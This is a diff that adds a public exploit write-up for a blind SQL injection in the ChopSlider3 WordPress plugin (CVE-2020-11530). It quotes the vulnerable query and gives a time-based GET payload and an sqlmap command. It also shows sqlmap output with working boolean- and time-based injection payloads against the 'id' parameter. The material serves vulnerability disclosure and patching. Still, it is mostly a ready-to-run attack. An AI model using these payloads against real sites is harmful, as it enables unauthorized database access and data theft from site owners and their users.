@@ -1,0 +1,46 @@
+# Exploit Title: ChopSlider3 Wordpress Plugin3.4 - 'id' SQL Injection
+# Exploit Author: SunCSR (Sun* Cyber Security Research)
+# Google Dork: N/A
+# Date: 2020-05 -12
+# Vendor Homepage: https://idangero.us/
+# Software Link: https://github.com/idangerous/Plugins
+# Version: <= 3.4
+# Tested on: Ubuntu 18.04
+# CVE: 2020-11530
+
+Description:
+A blind SQL injection vulnerability is present in Chop Slider 3
+'/wp-content/plugins/chopslider/get_script/index.php':
+$cs_result = $wpdb->get_row('SELECT * FROM ' . CHOPSLIDER_TABLE_NAME . '
+WHERE chopslider_id =' . $id);
+
+PoC:
+Blind SQL injection:
+GET /wp-content/plugins/chopslider/get_script/index.php?id=1111111 or
+(SELECT sleep(10))=6868
+SQLMap using:
+sqlmap -u '
+http://localhost/wp-content/plugins/chopslider/get_script/index.php?id=1111111111'
+--level=5 --risk=3
+sqlmap identified the following injection point(s) with a total of 17611
+HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-3097 OR 2236=2236
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=1111111111 OR SLEEP(5)
+---
+[08:55:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+
+I am looking forward to you accepting and approving my PoC.
+
+Thankyou!
+
+Vu Tien Hoa
